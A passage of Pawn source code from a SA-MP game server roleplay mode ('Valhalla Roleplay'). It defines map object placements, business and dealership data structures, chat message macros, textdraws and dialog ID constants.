    CreateDynamicObject(2974, 2926.5779, 4277.2715, 40.9413, 0.0000, 0.0000, 278.0969);
    CreateDynamicObject(2974, 2928.1638, 4277.4058, 43.7663, 0.0000, 0.0000, 278.0969);
    CreateDynamicObject(2974, 2924.7744, 4278.5913, 40.9413, 0.0000, 0.0000, 340.5964);
    CreateDynamicObject(3378, 2946.0964, 4280.7583, 42.1112, 0.0000, 0.0000, 304.1952);
    CreateDynamicObject(3378, 2946.0957, 4280.7578, 44.3512, 0.0000, 0.0000, 304.1949);
    CreateDynamicObject(3585, 2908.1560, 4065.1472, 42.5711, 0.0000, 0.0000, 47.8650);
    CreateDynamicObject(3585, 2906.3303, 4066.7869, 42.5711, 0.0000, 0.0000, 47.8619);
    CreateDynamicObject(3585, 2904.6826, 4068.4734, 42.5711, 0.0000, 0.0000, 39.9219);
    CreateDynamicObject(3585, 2903.3472, 4070.2861, 42.5711, 0.0000, 0.0000, 33.9639);
    CreateDynamicObject(3585, 2902.2825, 4072.2351, 42.5711, 0.0000, 0.0000, 20.8438);
    CreateDynamicObject(3585, 2901.7178, 4074.3394, 42.5461, 0.0000, 0.0000, 6.9461);
    CreateDynamicObject(3585, 2901.5010, 4076.6543, 42.5211, 0.0000, 0.0000, 2.9734);
    CreateDynamicObject(2991, 2950.1531, 4094.4287, 41.5690, 0.0000, 0.0000, 0.0000);
    CreateDynamicObject(2991, 2950.1523, 4094.4287, 42.8190, 0.0000, 0.0000, 0.0000);
    CreateDynamicObject(2991, 2950.1523, 4094.4287, 44.0690, 0.0000, 0.0000, 0.0000);
    CreateDynamicObject(2991, 2954.3076, 4093.2632, 41.5690, 0.0000, 0.0000, 328.1051);
    CreateDynamicObject(2991, 2954.3213, 4093.2837, 42.8190, 0.0000, 0.0000, 328.1012);
    CreateDynamicObject(2991, 2954.3213, 4093.2832, 44.0689, 0.0000, 0.0000, 328.1012);
    CreateDynamicObject(2991, 2942.9612, 4095.0745, 41.5439, 0.0000, 0.0000, 328.1012);
    CreateDynamicObject(2991, 2942.9609, 4095.0742, 42.7689, 0.0000, 0.0000, 328.1012);
    CreateDynamicObject(2991, 2942.9609, 4095.0742, 43.8939, 0.0000, 0.0000, 328.1012);
    CreateDynamicObject(2991, 2946.3823, 4094.3325, 45.2190, 359.2500, 358.0150, 4.0111);
    CreateDynamicObject(16301, 2914.8337, 4120.4917, 45.1091, 0.0000, 0.0000, 71.7750);
    CreateDynamicObject(16311, 2930.9119, 4148.0361, 52.3643, 0.0000, 0.0000, 45.8950);
    CreateDynamicObject(16311, 2953.0288, 4188.8677, 52.2393, 0.0000, 0.0000, 256.5099);
    CreateDynamicObject(16301, 2952.8406, 4220.3813, 44.2092, 358.7500, 358.0150, 282.2239);
    CreateDynamicObject(3865, 2907.0601, 4280.1265, 42.8752, 0.0000, 0.0000, 131.5950);
    CreateDynamicObject(3865, 2900.9775, 4273.8223, 42.8752, 0.0000, 0.0000, 141.5642);
    CreateDynamicObject(3865, 2897.5974, 4266.8145, 42.8752, 0.0000, 0.0000, 171.4688);
    CreateDynamicObject(3865, 2896.8999, 4258.4038, 42.8752, 0.0000, 0.0000, 181.4336);
    CreateDynamicObject(3865, 2897.0337, 4250.6128, 42.8752, 0.0000, 0.0000, 181.4282);
    CreateDynamicObject(3865, 2897.1570, 4241.4370, 42.8752, 0.0000, 0.0000, 181.4282);
    CreateDynamicObject(3865, 2897.2605, 4232.4385, 42.8752, 0.0000, 0.0000, 181.4282);
    CreateDynamicObject(3865, 2897.3896, 4223.4839, 42.8752, 0.0000, 0.0000, 181.4282);
    CreateDynamicObject(3865, 2897.3127, 4210.8110, 43.5502, 14.6750, 0.0000, 181.4282);
    CreateDynamicObject(3865, 2897.3782, 4202.7544, 46.6752, 27.8322, 0.0000, 181.4227);
    CreateDynamicObject(3865, 2897.4624, 4195.0615, 50.7502, 27.8284, 0.0000, 181.4227);
    CreateDynamicObject(3865, 2897.5408, 4187.7300, 55.5501, 37.7684, 0.0000, 181.4227);
    CreateDynamicObject(3865, 2897.4651, 4180.3711, 60.9252, 34.5455, 0.0000, 179.4227);
    CreateDynamicObject(3865, 2897.1863, 4171.4805, 64.1002, 4.7660, 0.0000, 178.4177);
    CreateDynamicObject(3675, 2964.6809, 4127.9097, 47.7725, 0.0000, 0.0000, 270.2703);
    CreateDynamicObject(3214, 2897.4216, 4162.3687, 56.3810, 0.0000, 0.0000, 0.0000);
    CreateDynamicObject(3214, 2897.3164, 4154.2368, 56.3810, 0.0000, 0.0000, 0.0000);
    CreateDynamicObject(3269, 2896.8799, 4150.0088, 42.3413, 0.0000, 0.0000, 348.0420);
    CreateDynamicObject(3865, 2898.0813, 4146.1489, 64.1002, 4.7626, 0.0000, 359.8123);
    CreateDynamicObject(3865, 2897.9731, 4137.1470, 62.7251, 12.7026, 0.0000, 359.8077);
    CreateDynamicObject(3865, 2897.8188, 4128.4048, 60.5751, 14.6852, 0.0000, 359.8022);
    CreateDynamicObject(3865, 2897.9934, 4119.8823, 57.8000, 20.9332, 0.0000, 3.7722);
    CreateDynamicObject(3865, 2898.4143, 4111.4478, 54.5500, 20.9290, 0.0000, 3.7683);
    CreateDynamicObject(3865, 2898.8235, 4103.2388, 51.1500, 23.1790, 0.0000, 3.7683);
    CreateDynamicObject(3865, 2899.2803, 4094.7463, 47.5000, 23.1757, 0.0000, 3.7628);
    CreateDynamicObject(3865, 2899.8013, 4087.6245, 45.1249, 14.9706, 0.0000, 5.7478);
    CreateDynamicObject(3865, 2900.8042, 4081.6189, 43.9000, 9.9839, 0.0000, 11.4958);
    CreateDynamicObject(3406, 2962.1606, 4124.8135, 47.0120, 0.0000, 0.0000, 0.0000);
    CreateDynamicObject(3406, 2951.8049, 4123.2603, 47.0120, 0.0000, 0.0000, 0.0000);
    CreateDynamicObject(12934, 2937.2039, 4098.4331, 44.3245, 0.0000, 0.0000, 199.4000);
    CreateDynamicObject(925, 2961.7756, 4241.9683, 42.0032, 0.0000, 0.0000, 0.0000);
    CreateDynamicObject(925, 2959.4500, 4241.9927, 42.0032, 0.0000, 0.0000, 0.0000);
    CreateDynamicObject(925, 2957.1260, 4242.0928, 42.0032, 0.0000, 0.0000, 0.0000);
    CreateDynamicObject(925, 2953.7290, 4242.2393, 42.0032, 0.0000, 0.0000, 0.0000);
    CreateDynamicObject(925, 2951.3335, 4243.0142, 42.0032, 0.0000, 0.0000, 0.0000);
    CreateDynamicObject(925, 2951.2844, 4242.9897, 44.0532, 0.0000, 0.0000, 0.0000);
    CreateDynamicObject(925, 2953.7285, 4242.2393, 44.1032, 0.0000, 0.0000, 0.0000);
    CreateDynamicObject(1348, 2946.2793, 4246.0381, 41.6438, 0.0000, 0.0000, 139.5800);
    CreateDynamicObject(964, 2953.7417, 4242.2329, 45.1740, 0.0000, 0.0000, 0.0000);
    CreateDynamicObject(3566, 2949.3616, 4258.5718, 43.5549, 0.0000, 0.0000, 49.8500);
    CreateDynamicObject(3566, 2936.5239, 4250.1211, 43.5549, 0.0000, 0.0000, 119.6350);
    CreateDynamicObject(3566, 2912.6487, 4244.3428, 43.5549, 0.0000, 0.0000, 229.3001);
    CreateDynamicObject(3761, 2932.2522, 4188.7314, 42.9402, 0.0000, 0.0000, 55.8950);
    CreateDynamicObject(3761, 2926.2815, 4193.4009, 42.9402, 0.0000, 0.0000, 135.6530);
    CreateDynamicObject(3761, 2935.1130, 4197.8228, 42.9402, 0.0000, 0.0000, 185.4984);
    CreateDynamicObject(3761, 2921.3103, 4200.0815, 42.9402, 0.0000, 0.0000, 125.6732);
    CreateDynamicObject(3761, 2917.0486, 4192.9609, 42.9402, 0.0000, 0.0000, 215.4027);
    CreateDynamicObject(2395, 2925.3589, 4167.7871, 71.9962, 270.6749, 0.0000, 359.0000);
    CreateDynamicObject(8171, 2946.4680, 4110.1543, 79.4213, 0.0000, 179.1870, 0.0000);
    CreateDynamicObject(2395, 2925.3147, 4165.0737, 71.9712, 270.6702, 0.0000, 358.9948);
    CreateDynamicObject(2395, 2925.2715, 4162.3584, 71.9462, 270.6702, 0.0000, 358.9948);
    CreateDynamicObject(2395, 2928.9763, 4162.2866, 71.9462, 270.6702, 0.0000, 358.9948);
    CreateDynamicObject(2395, 2929.0112, 4165.0371, 71.9712, 270.6702, 0.0000, 358.9948);
    CreateDynamicObject(2395, 2929.0752, 4167.7290, 71.9962, 270.6702, 0.0000, 358.9948);
    CreateDynamicObject(2395, 2925.4006, 4170.5552, 71.8462, 90.2851, 0.0000, 358.4797);
    CreateDynamicObject(2395, 2929.1240, 4170.4775, 71.8462, 90.2802, 0.0000, 358.9784);
    CreateDynamicObject(2395, 2929.1077, 4167.8022, 71.8462, 90.2802, 0.0000, 358.9783);
    CreateDynamicObject(2395, 2929.0605, 4165.1211, 71.8212, 90.2802, 0.0000, 358.9783);
    CreateDynamicObject(2395, 2925.3518, 4167.8628, 71.8212, 90.2802, 0.0000, 358.9783);
    CreateDynamicObject(2395, 2925.3230, 4165.1523, 71.8212, 90.2802, 0.0000, 358.9783);
    CreateDynamicObject(987, 2924.9365, 4162.5845, 71.7927, 0.0000, 0.0000, 0.0000);
    CreateDynamicObject(987, 2925.0972, 4174.1118, 71.8677, 0.0000, 0.0000, 270.2703);
    CreateDynamicObject(987, 2936.6013, 4174.0420, 71.8677, 0.0000, 0.0000, 180.5392);
    CreateDynamicObject(987, 2936.7102, 4162.2393, 71.8677, 0.0000, 0.0000, 90.8084);
    CreateDynamicObject(2395, 2925.3977, 4170.5176, 71.9962, 270.6702, 0.0000, 358.9948);
    CreateDynamicObject(2395, 2925.4326, 4171.6479, 71.9962, 270.6702, 0.0000, 358.9948);
    CreateDynamicObject(2395, 2929.1550, 4171.5186, 71.9962, 270.6702, 0.0000, 358.9948);
    CreateDynamicObject(2395, 2929.1260, 4169.9878, 71.9962, 270.6702, 0.0000, 358.9948);
    CreateDynamicObject(2395, 2932.8457, 4171.4375, 71.9962, 270.6702, 0.0000, 358.9948);
    CreateDynamicObject(2395, 2932.8379, 4168.7305, 71.9962, 270.6702, 0.0000, 358.9948);
    CreateDynamicObject(2395, 2932.7468, 4166.0405, 71.9962, 270.6702, 0.0000, 358.9948);
    CreateDynamicObject(2395, 2932.6855, 4163.2832, 71.9962, 270.6702, 0.0000, 358.9948);
    CreateDynamicObject(2395, 2932.6709, 4162.2046, 71.9962, 270.6702, 0.0000, 358.9948);
    CreateDynamicObject(2395, 2937.3682, 4162.5752, 71.9712, 270.6702, 0.0000, 88.7397);
    CreateDynamicObject(2395, 2937.3582, 4166.2656, 71.9712, 270.6647, 0.0000, 88.7366);
    CreateDynamicObject(2395, 2937.3662, 4169.9263, 71.9712, 270.6647, 0.0000, 88.7366);
    CreateDynamicObject(2395, 2937.5039, 4170.8687, 71.9712, 270.6647, 0.0000, 88.7366);
    CreateDynamicObject(2395, 2925.4963, 4173.2295, 71.8462, 90.2802, 0.0000, 358.4784);
    CreateDynamicObject(2395, 2925.4705, 4174.1040, 71.8462, 90.2802, 0.0000, 358.4784);
    CreateDynamicObject(2395, 2929.1973, 4174.0586, 71.8462, 90.2802, 0.0000, 358.4784);
    CreateDynamicObject(2395, 2929.2031, 4173.0093, 71.8462, 90.2802, 0.0000, 358.4784);
    CreateDynamicObject(2395, 2932.9282, 4173.9673, 71.8462, 90.2802, 0.0000, 358.4784);
    CreateDynamicObject(2395, 2932.8831, 4171.2441, 71.8462, 90.2802, 0.0000, 358.4784);
    CreateDynamicObject(2395, 2932.8367, 4168.5713, 71.8462, 90.2802, 0.0000, 358.4784);
    CreateDynamicObject(2395, 2932.8132, 4165.9478, 71.8462, 90.2802, 0.0000, 358.4784);
    CreateDynamicObject(2395, 2932.8315, 4165.2998, 71.8462, 90.2802, 0.0000, 358.4784);
    CreateDynamicObject(2395, 2934.0190, 4163.1309, 71.8462, 90.2802, 354.0450, 93.8027);
    CreateDynamicObject(2395, 2933.9878, 4166.7329, 71.8462, 90.2802, 356.0249, 93.8013);
    CreateDynamicObject(2395, 2933.8804, 4170.3828, 71.8462, 90.2802, 356.0229, 93.8013);
    CreateDynamicObject(987, 2936.6035, 4174.4302, 76.5927, 0.0000, 0.0000, 180.5383);
    CreateDynamicObject(987, 2937.1362, 4162.2231, 76.6927, 0.0000, 0.0000, 90.8075);
    CreateDynamicObject(987, 2924.9365, 4162.1846, 76.6927, 0.0000, 0.0000, 0.0000);
    CreateDynamicObject(987, 2924.6235, 4174.1113, 76.7927, 0.0000, 0.0000, 270.2692);
    CreateDynamicObject(1472, 2908.9597, 4064.4204, 41.3564, 0.0000, 0.0000, 48.6000);
}

stock WARMessage( w, color, string[] ) {
    foreach( Player, i ) {
        if( WARPInfo[ i ][ warID ] == w ) {
            SCM( i, color, string );
        }
    }
}

stock SetWarStatsTD( w ) {
    new string[ 128 ];
    foreach( Player, id ) {
        if( WARPInfo[ id ][ warID ] == w ) {
            format( string ,sizeof( string ),"~w~Kills: ~g~%d~n~~w~Deaths: ~r~%d~n~~w~Players: ~y~%d", WARInfo[ w ][ warTeamScore ][ 0 ], WARInfo[ w ][ warTeamScore ][ 1 ], WARInfo[ w ][ warTeamMembers ][ 0 ] );
            PlayerTextDrawSetString( id, WARTextDraw[ id ][ 5 ],  string );
            format( string ,sizeof( string ),"~w~Kills: ~g~%d~n~~w~Deaths: ~r~%d~n~~w~Players: ~y~%d", WARInfo[ w ][ warTeamScore ][ 1 ], WARInfo[ w ][ warTeamScore ][ 0 ], WARInfo[ w ][ warTeamMembers ][ 1 ] );
            PlayerTextDrawSetString( id, WARTextDraw[ id ][ 6 ],  string );
        }
    }
}
//-----------------------------[Forwards]---------------------------------------

forward StopWAR( w );
forward StopWARTimer( w );

//================================[ Saloni ]====================================

#define MAX_AUTOS 															 100
#define AS_FILE 								     		 "AutoSaloni/%i.ini"

enum aVtoSalo {
    aMaxVehModel,
	aVehModel[ 16 ],
	aVehAmmount[ 16 ],
	Float:aVehBuyedPos[ 4 ],
	Float:aPickupPos[ 3 ],
	Float:aCameraPos[ 3 ],
	Float:aCameraLookAt[ 3 ],
	Text3D:AutoSalon3D,
	AutoSalonPickup,
	aVW,
	aInt,
	aIzlogVeh,
	bool:AlreadyBuying
}
new AutoSalon[ MAX_AUTOS ][ aVtoSalo ];
new PlayerBuyingAS[ MAX_PLAYERS ];
new ModelCar[ MAX_PLAYERS ];

enum noclipenum {
	bool:cameramode,
	flyobject,
	mode,
	lrold,
	udold,
	lastmove,
	Float:accelmul
}
new flymodecamera[ MAX_PLAYERS ][noclipenum];

#define MOVE_FORWARD    		1
#define MOVE_BACK       		2
#define MOVE_LEFT       		3
#define MOVE_RIGHT      		4
#define MOVE_FORWARD_LEFT       5
#define MOVE_FORWARD_RIGHT      6
#define MOVE_BACK_LEFT          7
#define MOVE_BACK_RIGHT         8
#define MOVE_SPEED              100.0
#define ACCEL_RATE              0.03

//=================================[ Firme ]====================================

#define F_FILE 								     				  "Firme/%i.ini"
#define MAX_BUSSINES													     200
#define VRSTA_MARKET 														   1
#define VRSTA_JFIRMA 														   2
#define VRSTA_BURG 															   3
#define VRSTA_CLUCK															   4
#define VRSTA_BINCO															   5
#define VRSTA_ZIP														       6
#define VRSTA_VICTIM														   7
#define VRSTA_SUBURBAN														   8
#define VRSTA_GUNSHOP														   9
#define VRSTA_GYM														      10 
#define VRSTA_BAR														      11
#define VRSTA_RESTORAN														  12
#define VRSTA_PIZZA															  13
#define VRSTA_NKLUB 														  14
#define VRSTA_DISCO 														  15
#define VRSTA_ELEKTRONIK                                					  16
#define VRSTA_TRAFIKA                                					  	  17
#define VRSTA_POSAO                             					  	      18
#define VRSTA_RENT                             					  	      	  19
#define VRSTA_PUMPA                            					  	      	  20
#define VRSTA_JAVNAK                            					      	  21
#define VRSTA_KLAD                           					      	  	  22
#define VRSTA_PRAZANLOKAL                                                     23
#define VRSTA_CASINO                                                          24

#define TYPE_NEMA 															   0
#define TYPE_MESO 															   1
#define TYPE_PICE 															   2
#define TYPE_PAMUK 															   3
#define TYPE_BARUT 														       4
#define TYPE_JAJA														       5
#define TYPE_HRANA														       6

#define CARGO_PICE_PRICE 100
#define CARGO_JAJA_PRICE 400
#define CARGO_MESO_PRICE 650
#define CARGO_HRANA_PRICE 300
#define CARGO_BARUT_PRICE 1200
#define CARGO_PAMUK_PRICE 1000
#define MAX_CARGOS 10000

enum fInformacije {
    bOwned,
    bPrice,
    bOwner[ MAX_PLAYER_NAME ],
    bType,
    bLocked,
    bMoney,
    Float:bEnterX,
    Float:bEnterY,
    Float:bEnterZ,
    Float:bExitX,
    Float:bExitY,
    Float:bExitZ,
    bInt,
    bVW,
    bInInt,
    bProducts,
    bNProducts,
    bPriceProdukta,
    bInVW,
    bName[ 64 ],
    bLevel,
    bJobID,
    bNeaktivnost
}
new BussinesInfo[ MAX_BUSSINES ][ fInformacije ];
new FirmaPickup[ MAX_BUSSINES];
new Text3D:FirmaLabel[ MAX_BUSSINES];

enum xcargo {
	cType,
	cPlaced,
	Float:cObjPos[ 3 ],
	cVehID,
	cObjID
}
new Cargo[ MAX_CARGOS ][ xcargo ];

//=================================[ AntiCit ]==================================

#define ResetujBarNovac 									    ResetPlayerMoney
#define UpdejtujBarNovac 									     GivePlayerMoney

//==================================[ Server ]==================================

#define VERZIJA_MODA     							  	  	   "EW 1.0"
#define MAP_NAME    										   	        "Balkan"
#define D_ODABERI 												   	   "Potvrdi"
#define D_ODUSTANI 													  "Odustani"
#define D_NAZAD 													     "Nazad"
#define D_NASLOV                 ""SRVBOJA1SCM"Valhalla {FFFFFF}Roleplay"
#define UKLJUCEN 															   1
#define ISKLJUCEN 															   0

//==================================[ Script ]==================================

#define SPD                                                     ShowPlayerDialog
#define SCMA 											  SendClientMessageToAll
#define DSL 												   DIALOG_STYLE_LIST
#define IPI 												   INVALID_PLAYER_ID
#define DSI                                                   DIALOG_STYLE_INPUT
#define DSP                                                DIALOG_STYLE_PASSWORD
#define DSMSG 												 DIALOG_STYLE_MSGBOX

#define SendErrorMessage(%0,%1) \
	SendClientMessageEx(%0, -1, "{F5052D}[GRESKA] {FFFFFF} "%1)

#define SendJobMessage(%0,%1) \
	SendClientMessageEx(%0, -1, "{36AB00}[POSAO] {FFFFFF} "%1)

#define SendInfoMessage(%0,%1) \
	SendClientMessageEx(%0, -1, "{4655B2}[INFO] {FFFFFF} "%1)

#define SendPaparazoMessage(%0,%1) \
    SendClientMessageEx(%0, -1, "{351C75}(PAPARAZO LOV) {FFFFFF}"%1)

#define SendUsageMessage(%0,%1) \
	SCM(%0, -1, ""col_orange"[KORISCENJE] {FFFFFF} "%1) // ff6600 narandzasta

#define HungerMessage(%0,%1)       SendClientMessage(%0, 0xC34848FF, "(HungerGames): {FFFFFF}"%1)

#define FunRaceMessage(%0,%1)        SendClientMessage(%0, 0xF81414FF, "(FunRace): {FFFFFF}"%1)

#define VojnikMessage(%0,%1)		SendClientMessageEx(%0, 0xC34848FF, "(VojnikPosao): {FFFFFF}"%1)

#define SendSabotage(%0,%1)				SendClientMessage(%0, 0xC34848FF, "(Sabotazer): {FFFFFF}"%1)

#define SendHotRun(%0,%1)            SendClientMessage(%0, 0xC34848FF, "(Hot Run): {FFFFFF}"%1)

#define SendDeagle(%0,%1)          SendClientMessage(%0, 0xF81414FF, "(Deagle Master): {FFFFFF}"%1)

#define SendSkillMessage(%0,%1)     SendClientMessageEx(%0, -1, "{351C75}[SKILL SYSTEM] {FFFFFF} "%1)

#define SendTrainMessage(%0,%1) \
    SendClientMessageEx(%0, 0xFFFF00FF, "{33AA33}(VOZ) {FFFFFF} "%1)

//==============================[ Spawn ]=======================================

#define SPAWN_OBICAN_LS_1													   0
#define SPAWN_BAZA														   	   1
#define SPAWN_IMOVINA_1														   2
#define SPAWN_IMOVINA_2														   3
#define SPAWN_IMOVINA_3														   4
#define SPAWN_BELAKUCA 														   5
#define SPAWN_OBICAN_LS_2													   6
#define SPAWN_OBICAN_SF														   7
#define SPAWN_RENTHOTEL														   8
#define SPAWN_ADMIN														       9
#define SPAWN_PROMOTER													      10
#define SPAWN_RENT													      	  11

//===========================[ Tekstdraws ]=====================================

new PlayerText:CKilometri[ MAX_PLAYERS ][ 4 ];
new PlayerText:BuyCar[ MAX_PLAYERS ][ 9 ];
new PlayerText:ZaposljavanjeTD[ MAX_PLAYERS ][ 9 ];
//new PlayerText:WARTextDraw[ MAX_PLAYERS ][ 9 ];
new PlayerText:Ormar[ MAX_PLAYERS ][ 10 ];
new PlayerText:Police_TV[ MAX_PLAYERS ][ 14 ];
new Text:Login_TD[33];
new Text:Login_TDFirst[3];

new Text:HappyHoursTD[3];

new PlayerText:RegisterTD[ MAX_PLAYERS ][ 34 ];

new PlayerText:PVreme[ MAX_PLAYERS ][ 5 ];
new PlayerText:PizzaMenu[ MAX_PLAYERS ][ 25 ];
new PlayerText:atmTD[ MAX_PLAYERS ][ 14 ];
new PlayerText:atmrobLoading[ MAX_PLAYERS ][ 2 ];
new PlayerText:buyWatch[ MAX_PLAYERS ][ 8 ];
new PlayerText:TuningBuy[ MAX_PLAYERS ][ 14 ];
new PlayerText:Fading[ MAX_PLAYERS ];

new PlayerText:Brzinomer[ MAX_PLAYERS ][ 11 ];
new PlayerText:TaxistaTD[ MAX_PLAYERS ][ 8 ];
new PlayerText:SpecTextDraw[ MAX_PLAYERS ];

new PlayerText:BankaIgraca[ MAX_PLAYERS ];
new PlayerText:SkinIgraca[MAX_PLAYERS];
new PlayerText:ZlatoIgraca[ MAX_PLAYERS ];
// new PlayerText:DoPlateTD[MAX_PLAYERS];
// new PlayerText:PrljavNovacTD[MAX_PLAYERS];
new PlayerText:LokacijaIgracaTD[MAX_PLAYERS];
// new PlayerText:LevelIgracaTD[MAX_PLAYERS];
new PlayerText:WantedIgraca[ MAX_PLAYERS ];
// new PlayerText:RandomSPorukeTD[MAX_PLAYERS];

new Text:InGame_TD[30];

new Text:WastedTD[2];
new bool:wastedTDShown[MAX_PLAYERS];

new granicabgzgulaz;
new granicabgzgizlaz;
new granicabgsaulaz;
new granicabgsaizlaz;
new granicaLSFlorida;
new granicaFloridaLS;
//=============================[ Dialozi ]======================================

#define dialog_REGISTER 										   			   1
#define dialog_COUNTRY 										   				   2
#define dialog_AGE								       		   				   3
#define dialog_MAIL										   	   				   4
#define dialog_ORGANIZACIJA          										   5
#define dialog_PHARMACY           										   	   6
#define dialog_ORGCREATE          										       7
#define dialog_ORGTIP           										       8
#define dialog_MARKETBUY	          										   9
#define dialog_ORGRANK1           										      10
#define dialog_ORGRANK2           										      11
#define dialog_ORGRANK3           										      12
#define dialog_ORGRANK4           										      13
#define dialog_ORGRANK5           										      14
#define dialog_ORGRANK6          										      15
#define dialog_ORGINT1          										      16
#define dialog_ORGINT2          										      17
#define dialog_SERVERMI          										      18
#define dialog_NAPRAVISVE           										  19
#define dialog_IZBRISISVE          										      20
#define dialog_LIDER 														  21
#define dialog_UBACIUORG                                                      22
#define dialog_IZBACIIZORG                                                    23
#define dialog_DODELIRANK                                                     24
#define dialog_SVICLANOVI                                                     25
#define dialog_ORGDELETE 													  26
#define dialog_IZMENISVE 													  27
#define dialog_ORGEDIT 														  28
#define dialog_ORGNAME 	 													  29
#define dialog_ORGRANKS 													  30
#define dialog_CLUCKIN 														  31
#define dialog_RESTORAN														  32
#define dialog_PIZZA														  33
#define dialog_DRINK														  34
#define dialog_GUNSHOP														  35
#define dialog_FNAME														  36
#define dialog_FEDIT														  37
#define dialog_FSELL														  38
#define dialog_FOPEN														  39
#define dialog_FCLOSE														  40
#define dialog_FPROD														  41
#define dialog_M_ISPIT														  42
#define dialog_PCREATE														  43
#define dialog_VCREATE 														  44
#define dialog_FNPROD 														  45
#define dialog_RADIO														  46
#define dialog_A_ISPIT														  47
#define dialog_K_ISPIT														  48
#define dialog_RENTANJE 													  49
#define dialog_RVCREATE 													  50
#define dialog_PROPERTYWEPTAKE 												  51
#define dialog_JOBLIST 														  52
#define dialog_EVENTSTART 													  53
#define dialog_CREATEEVENT													  54
#define dialog_CREATEEVENT2													  55
#define dialog_GPS		    												  57
#define dialog_FCREATE              										  58
#define dialog_FIRMA              										  	  59
#define dialog_FOMONEY              										  60
#define dialog_FPMONEY              										  61
#define dialog_FINFO              										  	  62
#define dialog_FLOCK              										  	  63
#define dialog_FCNAME              										  	  64
#define dialog_CARGOS 										  				  65
#define dialog_ORGSPISAK													  66
#define dialog_BURGMENU 													  67
#define dialog_C2_ISPIT													      68
#define dialog_C3_ISPIT													      69
#define dialog_HELP 														  70
#define dialog_LOGIN 														  71
#define dialog_ORGLIST														  72
#define dialog_IMCREATE														  73
#define dialog_ORMAR													  	  74
#define dialog_BUY_MOBILEPHONE												  75
#define dialog_SEARCH_NAME													  76
#define dialog_SEARCH_NUMBERPLATE											  77
#define dialog_POSTAVIPOTERU											      78
#define dialog_OCISTIDOSIJE											          79
#define dialog_OPREMA										          		  80
#define dialog_VEHICLEWEPTAKE									         	  81
#define dialog_MUNIFORM										          		  82
#define dialog_TAXIOFFER									          		  83
#define dialog_KIOSK									          		 	  84
#define dialog_SPAWNCHANGE									          		  85
#define dialog_PAYDAY 								          		  		  86
#define dialog_KREDIT								          		  		  87
#define dialog_INFOKREDIT								          		  	  88
#define dialog_PROMENARATEKREDITA								          	  89
#define dialog_BALANCE								          	  			  90
#define dialog_RPTEST								          	  			  91
#define dialog_BANSTATUS							          	  			  92
#define dialog_FDELETE						          	  			          93
#define dialog_IMDELETE					          	  			              94
#define dialog_OVCREATE				          	  			              	  95
#define dialog_CHANGEPASSWORD			          	  			              96
#define dialog_GPS_FIND     												  97
#define dialog_VEDIT    												      98
#define dialog_VPRICE    												      99
#define dialog_ICPRICE 														 100
#define dialog_IOPEN 														 101
#define dialog_ICLOSE 														 102
#define dialog_ISELL 														 103
#define dialog_ORGSKINS													     104
#define dialog_IEDIT 														 105
#define dialog_VIP	    													 117
#define dialog_IZMENABROJA 													 118
#define dialog_DOGLAS												 		 119
#define dialog_ORGPREFIX											 		 120
#define dialog_VCOLOR											 		     121
#define dialog_OFFIZBACIIZORG								 		         122
#define dialog_ORGDUTYP							 		         	 		 123
#define dialog_ORGEQUIPP						 		         	 		 124
#define dialog_PROPERTYLIST						 		         	 		 125
#define dialog_PROPCHOSEN						 		         	 		 126
#define dialog_PROPUNAPREDI						 		         	 		 127
#define dialog_SAFEPUTDRUG					 		         	 		     128
#define dialog_SAFETAKEDRUG					 		         	 		 	 129
#define dialog_SAFECHANGEPASS					 		         	 		 130
#define dialog_SAFEUNLOCK					 		         	 		 	 131
#define dialog_SAFEALL					 		         	 		 		 132
#define dialog_PROPSELLTP			 		         	 		 		 	 133
#define dialog_ACCEPTPROP			 		         	 		 		 	 134
#define dialog_ACCEPTFRIMA			 		         	 		 		 	 135
#define dialog_FIRMASELLTP			 		         	 		 		 	 136
#define dialog_ASMODEL			 		         	 		 		 	     137
#define dialog_ASMAXMODEL		 		         	 		 		 	     138
#define dialog_VEHCHOSEN		 		         	 		 		 	     139
#define dialog_VEHLIST		 		         	 		 		 	     	 140
#define dialog_VEHICLETAKEDRUG		         	 		 		 	     	 141
#define dialog_VEHICLEPUTDRUG		         	 		 		 	     	 142
#define dialog_GEPEKIZVADI  	 	 		 		 		 	 	      	 143
#define dialog_IVCREATE		         	 		 		 	     	 		 144
#define dialog_PORTABLE	         	 		 		 	     	 		 	 145
#define dialog_GIVEHIT	         	 		 		 	     	 		 	 146
#define dialog_HORDER	         	 		 		 	     	 		 	 147
#define dialog_RESETIRAJ	         	 		 		 	     	 		 148
#define dialog_SELECTSPORT	         	 		 		 	     	 		 149
#define dialog_CREATESPORT	         	 		 		 	     	 		 150
#define dialog_AVCREATE		         	 		 		 	     	 		 151
#define dialog_ANTICHEAT	         	 		 		 	     	 		 152
#define dialog_ANTICHEAT_2	         	 		 		 	     	 		 153
#define dialog_ANTICHEAT_3	         	 		 		 	     	 		 154
#define dialog_PROPSELLDRZAVA	         	 		 		 	     	 	 155
#define dialog_FIRMASELLDRZAVA	         	 		 		 	     	 	 156
#define dialog_POLVCREATE		 		 	     	 	 				     157
#define dialog_ORGPORTP 		 		 	     	 	 				     158
#define dialog_HOTEL		 		 	     	 	 				         159
#define dialog_HOTELRENTP	 		 	     	 	 				         160
#define dialog_HOTELIZBACI	 		 	     	 	 				         161
#define dialog_HPMONEY	 		 	     	 	 				          	 162
#define dialog_HOMONEY	 		 	     	 	 				         	 163
#define dialog_HOTELLOCK 		 	     	 	 				         	 164
#define dialog_HOTELSELLDRZAVA	 	     	 	 				         	 165
#define dialog_HOTELSELLTP	 	     	 	 				         	 	 166
#define dialog_ACCEPTHOTEL	 	     	 	 				         	 	 167
#define dialog_HEDIT 	     	 	 				         	 	 		 168
#define dialog_HEPRICE 	     	 	 				         	 	 		 169
#define dialog_HELEVEL 	     	 	 				         	 	 		 170
#define dialog_POREZ	     	 	 				         	 	 		 171
#define dialog_POREZPAY	     	 	 				         	 	 		 172
#define dialog_EMAIL   	 	 				         	 	 		 		 173
#define dialog_CREATEGATE	 				         	 	 		 		 174
#define dialog_CREATEGATE_2 				         	 	 		 		 175
#define dialog_CREATEGATE_3 				         	 	 		 		 176
#define dialog_CREATEGATE_4 				         	 	 		 		 177
#define dialog_ORGZSKINS			         	 	 		 		 		 178
#define dialog_CREATEVEH			         	 	 		 		 		 179
#define dialog_GRCREATE			         	 	 		 		 		 	 180
#define dialog_ORGMAXMEMB	         	 	 		 		 		 	 	 181
#define dialog_PILOT	         	 	 		 		 		 	 	     182
#define dialog_GEPEK      	 	 		 		 		 	 	        	 191
#define dialog_GEPEKOSTAVI      	 	 		 		 		 	 	     192
#define dialog_IZVADIGAJBICE  	 	 		 		 		 	 	     	 193
